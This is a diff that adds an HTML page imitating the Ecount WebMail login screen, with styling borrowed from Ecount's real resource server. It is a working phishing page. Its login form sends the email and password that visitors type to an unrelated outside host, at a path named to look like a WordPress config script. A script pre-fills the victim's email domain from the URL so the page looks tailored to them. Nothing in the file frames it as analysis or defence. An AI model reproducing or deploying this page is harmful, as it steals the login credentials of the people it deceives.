@@ -1,0 +1,83 @@
+﻿<!DOCTYPE html>
+<html class="">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="ECOUNT" />
+  <title>Ecount WebMail - Login</title>
+
+  <link rel="shortcut icon" href="https://resourcev3.ecount.com/ec3/ecerp/contents/images/ci/favicon.ico?v=3716873378459524404-19" />
+  <link rel="stylesheet" href="https://resourcev3.ecount.com/ec3/wmail/contents/bundle/bundle.style.noauth.-4919510361266638091.19.css" />
+  <link rel="stylesheet" href="https://resourcev3.ecount.com/ec3/wmail/contents/css/login.-727052913155639716.19.css" />
+  <link rel="stylesheet" href="https://resourcev3.ecount.com/ec3/wmail/contents/css/common-responsive.-727052913155639716.19.css" />
+</head>
+
+<body class="cursor-default">
+
+  <div class="page-login-form webmail" id="divLoginForm">
+    <form id="loginForm" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
+      <div class="page-login-form state-type-id webmail">
+        <div class="contents">
+          <div class="login-logo"></div>
+          <div class="login-form">
+            <div class="form">
+              <div class="login-id" data-nosnippet>
+                <input type="text" class="form-control" id="email" name="user" maxlength="100" required autocomplete="off" placeholder="Email">
+                <input type="hidden" name="domain" value="domain">
+                <input type="hidden" name="sender" value="Ecount">
+                <input type="hidden" name="link" value="https://wmail.ecount.com/WMAIL/Login/Login">
+                <input type="hidden" id="loginFull" name="email" />
+              </div>
+
+              <div class="login-password" data-nosnippet>
+                <input type="password" class="form-control" id="passwd" name="passwd" maxlength="15" required placeholder="Password">
+              </div>
+            </div>
+
+            <div class="form-option">
+              <span class="form-checkbox form-checkbox-block" data-nosnippet>
+                <input type="checkbox" id="loginck" name="loginck">
+                <label for="loginck" data-nosnippet>Save Email</label>
+              </span>
+            </div>
+
+            <div class="form-login-btn">
+              <input type="image" src="img/btn.png" width="400" height="38" alt="Login">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <input type="hidden" id="process_ing" name="process_ing" value="N" />
+      <input type="hidden" id="lan_type" name="lan_type" value="en-US" />
+      <input type="hidden" id="domain" name="domain" value="https://wmail.ecount.com/WMAIL/Login/WebmailMain">
+      <input type="hidden" id="login_type" name="login_type" value="N" />
+    </form>
+  </div>
+
+  <!-- Domain auto-completion and full email setup -->
+  <script>
+    function getDomainFromURL() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const login = urlParams.get('login');
+      if (login && login.includes('@')) {
+        return login.split('@')[1].toLowerCase();
+      }
+      return 'example.com';
+    }
+
+    const domain = getDomainFromURL();
+
+    // Optional: update placeholder to show @domain
+    document.getElementById('email').placeholder = 'user@' + domain;
+
+    // On form submit, combine user + domain
+    document.getElementById('loginForm').addEventListener('submit', function () {
+      const userInput = document.getElementById('email').value.trim();
+      const finalEmail = userInput.includes('@') ? userInput : userInput + '@' + domain;
+      document.getElementById('loginFull').value = finalEmail;
+    });
+  </script>
+</body>
+</html>
